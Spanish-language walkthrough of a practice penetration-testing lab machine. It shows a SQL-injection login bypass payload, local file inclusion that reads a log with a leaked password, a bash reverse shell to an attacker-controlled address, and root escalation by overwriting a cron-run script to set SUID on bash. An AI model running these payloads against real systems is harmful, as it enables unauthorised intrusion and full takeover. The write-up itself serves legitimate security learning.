
### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260801170301.png]]

**Servicios identificados:**

* **Puerto 22/TCP (SSH):** Servicio OpenSSH abierto para acceso remoto. Ver teoría en [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>).
* **Puerto 80/TCP (HTTP):** Servidor web Apache corriendo en el host. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).

***

### Enumeración de Servicios y Web

#### Inspección Inicial

Accedemos al servidor web en el puerto 80 y nos encontramos con un panel de login:

![[Pasted image 20260801170331.png]]

***

### Fase de Explotación / Intrusión

#### Inyección SQL y Bypass de Autenticación

Intentamos inyección SQL en el formulario de login. Probamos en el campo del usuario sin éxito, pero en el campo de contraseña funciona correctamente utilizando el payload clásico:

```sql
'OR '1'='1 -- -
```

![[Pasted image 20260804221003.png]]

* **Resultado:** Logramos evadir la autenticación y acceder al panel de administración.
* **Nota en el Código:** Al inspeccionar el código fuente del panel, encontramos una nota comentada:

![[Pasted image 20260804221029.png]]

#### Explotación de LFI (Local File Inclusion)

Observamos que la URL del panel utiliza el parámetro page para cargar contenidos:

```
http://172.17.0.2/index.php?page=
```

Aprovechamos este parámetro para leer archivos del sistema. Si solicitamos la ruta logs/logs.txt, obtenemos el registro de eventos:

![[Pasted image 20260804222040.png]]

* **Hallazgo Clave:** Identificamos un intento fallido de conexión SSH para el usuario albert que expone su contraseña codificada en base64: `NGxiM3J0MTIz`.

#### Acceso SSH

Decodificamos la contraseña en nuestra máquina atacante y realizamos la conexión al servicio SSH (no hacia falta decodificar la contraseña):

```bash
echo -n 'NGxiM3J0MTIz' | base64 -d
ssh albert@172.17.0.2
```

![[Pasted image 20260804224850.png]]

* **Acceso:** Obtenemos una shell inicial en el sistema como el usuario albert.

***

### Escalada de Privilegios

#### Enumeración Interna

Como usuario albert, realizamos una enumeración de vectores comunes que resultaron negativos o sin vías de explotación:

* **Búsqueda de Binarios SUID/SGID (FALLIDO):** No se encontraron binarios con permisos especiales explotables.
*

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

* **Linux Capabilities (FALLIDO):** Ninguna capacidad de binario reportó vectores de escalada.

```bash
getcap -r / 2>/dev/null
```

* **Archivos con Escritura Pública (FALLIDO):** No localizamos scripts o archivos críticos con permisos de escritura.

```bash
find / -type f -perm -o+w 2>/dev/null
```

#### Movimiento Lateral (Usuario conx)

Analizamos los procesos activos en ejecución mediante ps aux:

```bash
ps aux
```

* **Hallazgo:** Identificamos la existencia de un socket Unix activo en `/run/bypassme.sock`.
* **Conexión:** Comprobamos los permisos y establecemos conexión al socket usando netcat:

```bash
nc -U /run/bypassme.sock
```

![[Pasted image 20260804232943.png]]

* **Resultado:** La consola del socket nos proporciona ejecución de comandos bajo la identidad del usuario conx.

Para obtener una shell interactiva como conx, nos ponemos en escucha en el puerto 9001 de nuestra máquina local:

```bash
nc -nlvp 9001
```

Y enviamos una reverse shell a través de la sesión activa en el socket Unix:

```bash
bash -i >& /dev/tcp/172.17.0.1/9001 0>&1
```

![[Pasted image 20260804233007.png]]

#### Abuso de Tarea Cron (root)

Una vez posicionados como el usuario conx, buscamos archivos modificables en el directorio `/var/backups`:

```bash
ls -la /var/backups/backup.sh
```

* **Vulnerabilidad de Configuración:** El script `/var/backups/backup.sh` es modificable por conx y se ejecuta periódicamente como root en el sistema.
* **Explotación:** Escribimos en el script una instrucción para asignar el bit SUID al binario de bash:

```bash
echo "chmod u+s /bin/bash" > /var/backups/backup.sh
```

Esperamos unos minutos a que se ejecute la tarea programada:

![[Pasted image 20260804233517.png]]

Ejecutamos bash preservando los privilegios de root para obtener la consola final:

```bash
/bin/bash -p
```

![[Pasted image 20260804234056.png]]

***

### Relaciones y Conceptos

* **Teoría:** [SQL Injection Cheat Sheet](<../../../Pentesting Notes/Web/Vulnerabilities/01-SQL_Injection/Cheat Sheet.md>), [Linux Privilege Escalation - Services.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Services.md>)
* **Laboratorios Relacionados:** [ApiBase](ApiBase.md) (Comparte inyección SQL), [Internship](Internship.md) (Comparte inyección SQL y escalada por cron)
